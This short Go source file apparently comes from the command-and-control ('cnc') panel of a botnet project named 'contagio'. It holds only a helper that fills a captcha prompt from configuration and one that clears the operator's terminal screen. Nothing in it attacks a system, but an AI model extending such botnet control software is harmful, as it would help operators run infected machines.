package cnc

import (
	"contagio/contagio/config"
	"strings"
)

func (c *Connection) createCaptchaPrompt(code string) string {

	prompt := c.config.Auth.CaptchaPrompt

	prompt = config.ParseColors(prompt)

	prompt = strings.ReplaceAll(prompt, "{code}", code)

	return prompt
}

func (c *Connection) Cls() {
	c.conn.Write([]byte("\x1B[2J\x1B[H"))
}
